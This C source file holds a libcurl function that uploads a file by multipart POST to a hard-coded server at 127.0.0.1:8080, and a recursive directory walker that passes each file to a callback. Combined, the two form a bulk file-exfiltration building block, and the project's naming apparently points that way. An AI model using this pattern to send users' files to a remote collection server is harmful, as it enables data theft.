
#include "../0x_includes/ext.h"

int upload_file(const char *filepath) {
    CURL *curl = curl_easy_init();
    if (!curl) return 1;

    CURLcode res;
    curl_mime *mime;
    curl_mimepart *part;

    mime = curl_mime_init(curl);
    part = curl_mime_addpart(mime);
    curl_mime_name(part, "file");
    curl_mime_filedata(part, filepath);

    curl_easy_setopt(curl, CURLOPT_URL, "127.0.0.1:8080");
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

    res = curl_easy_perform(curl);
    if (res != CURLE_OK)
        fprintf(stderr, "Upload failed: %s\n", curl_easy_strerror(res));

    curl_mime_free(mime);
    curl_easy_cleanup(curl);

    return (res == CURLE_OK) ? 0 : 1;
}

void traverse_folder(const char *path, void (*file_callback)(const char *file_path)) {
    DIR *dir = opendir(path);
    if (!dir) return;

    struct dirent *entry;
    char fullpath[PATH_MAX];

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);

        struct stat st;
        if (stat(fullpath, &st) == -1) continue;

        if (S_ISDIR(st.st_mode))
            traverse_folder(fullpath, file_callback);
        else if (S_ISREG(st.st_mode))
            file_callback(fullpath);
    }
    closedir(dir);
}